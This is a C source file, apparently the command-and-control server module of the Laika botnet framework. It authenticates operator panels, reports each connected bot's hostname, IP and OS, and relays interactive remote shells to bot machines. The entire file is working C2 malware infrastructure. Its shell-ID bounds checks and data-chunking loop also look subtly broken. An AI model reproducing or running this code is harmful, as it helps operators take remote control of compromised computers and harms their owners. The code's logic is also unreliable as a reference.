#include "lerror.h"
#include "lmem.h"

#include "cnc.h"
#include "cpeer.h"
#include "cpanel.h"

bool sendPanelPeerIter(struct sLaika_peer *peer, void *uData) {
    struct sLaika_peer *authPeer = (struct sLaika_peer*)uData;

    /* make sure we're not sending connection information to themselves */
    if (peer != authPeer) {
        LAIKA_DEBUG("sending peer info %p to auth %p)\n", peer, authPeer);
        laikaC_sendNewPeer(authPeer, peer);
    }

    return true;
}

void laikaC_sendNewPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer) {
    laikaS_startOutPacket(authPeer, LAIKAPKT_AUTHENTICATED_ADD_PEER_RES);

    /* write the peer's info */
    laikaS_write(&authPeer->sock, peer->peerPub, sizeof(peer->peerPub));
    laikaS_write(&authPeer->sock, peer->hostname, LAIKA_HOSTNAME_LEN);
    laikaS_write(&authPeer->sock, peer->inet, LAIKA_INET_LEN);
    laikaS_write(&authPeer->sock, peer->ipv4, LAIKA_IPV4_LEN);
    laikaS_writeByte(&authPeer->sock, peer->type);
    laikaS_writeByte(&authPeer->sock, peer->osType);

    laikaS_endOutPacket(authPeer);
}

void laikaC_sendRmvPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer) {
    laikaS_startOutPacket(authPeer, LAIKAPKT_AUTHENTICATED_RMV_PEER_RES);

    /* write the peer's pubkey */
    laikaS_write(&authPeer->sock, peer->peerPub, sizeof(peer->peerPub));
    laikaS_writeByte(&authPeer->sock, peer->type);

    laikaS_endOutPacket(authPeer);
}

/* ============================================[[ Packet Handlers ]]============================================= */

void laikaC_handleAuthenticatedHandshake(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
    struct sLaika_cnc *cnc = pInfo->cnc;
    PEERTYPE type;
    int i;

    type = laikaS_readByte(&authPeer->sock);
    switch (type) {
        case PEER_AUTH:
            /* check that peer's pubkey is authenticated */
            if (!laikaK_checkAuth(authPeer->peerPub, cnc->authKeys, cnc->authKeysCount))
                LAIKA_ERROR("unauthorized panel!\n");

            /* notify cnc */
            laikaC_setPeerType(cnc, authPeer, PEER_AUTH);
            LAIKA_DEBUG("Accepted authenticated panel %p\n", authPeer);

            /* they passed! send list of our peers */
            laikaC_iterPeers(cnc, sendPanelPeerIter, (void*)authPeer);
            break;
        default:
            LAIKA_ERROR("unknown peerType [%d]!\n", authPeer->type);
    }
}

void laikaC_handleAuthenticatedShellOpen(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
    uint8_t pubKey[crypto_kx_PUBLICKEYBYTES];
    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
    struct sLaika_cnc *cnc = pInfo->cnc;
    struct sLaika_peer *peer;
    uint16_t cols, rows;

    /* read pubkey & find peer */
    laikaS_read(&authPeer->sock, pubKey, crypto_kx_PUBLICKEYBYTES);
    if ((peer = laikaC_getPeerByPub(cnc, pubKey)) == NULL)
        LAIKA_ERROR("laikaC_handleAuthenticatedShellOpen: Requested peer doesn't exist!\n");

    if (peer->type != PEER_BOT)
        LAIKA_ERROR("laikaC_handleAuthenticatedShellOpen: Requested peer isn't a bot!\n");

    /* read term size */
    laikaS_readInt(&authPeer->sock, &cols, sizeof(uint16_t));
    laikaS_readInt(&authPeer->sock, &rows, sizeof(uint16_t));

    /* open shell */
    laikaC_openShell(peer, authPeer, cols, rows);
}

void laikaC_handleAuthenticatedShellClose(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
    struct sLaika_cnc *cnc = pInfo->cnc;
    struct sLaika_shellInfo *shell;
    uint32_t id;

    laikaS_readInt(&authPeer->sock, &id, sizeof(uint32_t));

    /* ignore malformed packet */
    if (id > LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
        return;

    laikaC_closeShell(shell);
}

/* improves readability */
#define SENDSHELLDATA(peer, data, size, id) \
    laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA); \
    laikaS_writeInt(&peer->sock, id, sizeof(uint32_t)); \
    laikaS_write(&peer->sock, data, size); \
    laikaS_endVarPacket(peer);

void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
    uint8_t data[LAIKA_SHELL_DATA_MAX_LENGTH];
    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
    struct sLaika_cnc *cnc = pInfo->cnc;
    struct sLaika_peer *peer;
    struct sLaika_shellInfo *shell;
    uint32_t id;

    if (sz-sizeof(uint32_t) > LAIKA_SHELL_DATA_MAX_LENGTH || sz <= sizeof(uint32_t))
        LAIKA_ERROR("laikaC_handleAuthenticatedShellData: Wrong data size!\n");

    laikaS_readInt(&authPeer->sock, &id, sizeof(uint32_t));
    sz -= sizeof(uint32_t);

    /* ignore malformed packet */
    if (id > LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
        return;

    peer = shell->bot;

    /* read data */
    laikaS_read(&authPeer->sock, data, sz);

    /* forward data to peer */
    if (authPeer->osType == peer->osType) {
        if (sz + sizeof(uint32_t) > LAIKA_SHELL_DATA_MAX_LENGTH) {
            /* we need to split the buffer since the packet for c2c->bot includes an id (since a bot can host multiple shells, 
                while the auth/shell client only keeps track of 1)
            */

            /* first part */
            SENDSHELLDATA(peer, data, sz-sizeof(uint32_t), &shell->botShellID);

            /* second part */
            SENDSHELLDATA(peer, data + (sz-sizeof(uint32_t)), sizeof(uint32_t), &shell->botShellID);
        } else {
            SENDSHELLDATA(peer, data, sz, &shell->botShellID);
        }
    } else if (authPeer->osType == OS_LIN && peer->osType == OS_WIN) { /* convert data if its linux -> windows */
        uint8_t *buf = laikaM_malloc(sz);
        int i, count = 0, cap = sz;

        /* convert line endings */
        for (i = 0; i < sz; i++) {
            laikaM_growarray(uint8_t, buf, 2, count, cap);

            switch (data[i]) {
                case '\n':
                    buf[count++] = '\r';
                    buf[count++] = '\n';
                    break;
                default:
                    buf[count++] = data[i];
            }
        }

        /* send buffer (99% of the time this isn't necessary, but the 1% can make
            buffers > LAIKA_SHELL_DATA_MAX_LENGTH. so we send it in chunks) */
        i = count;
        while (i+sizeof(uint32_t) > LAIKA_SHELL_DATA_MAX_LENGTH) {
            SENDSHELLDATA(peer, buf + (count - i), LAIKA_SHELL_DATA_MAX_LENGTH-sizeof(uint32_t), &shell->botShellID);            
            i -= LAIKA_SHELL_DATA_MAX_LENGTH;
        }

        /* send the leftovers */
        SENDSHELLDATA(peer, buf + (count - i), i, &shell->botShellID);
        laikaM_free(buf);
    }
}

#undef SENDSHELLDATA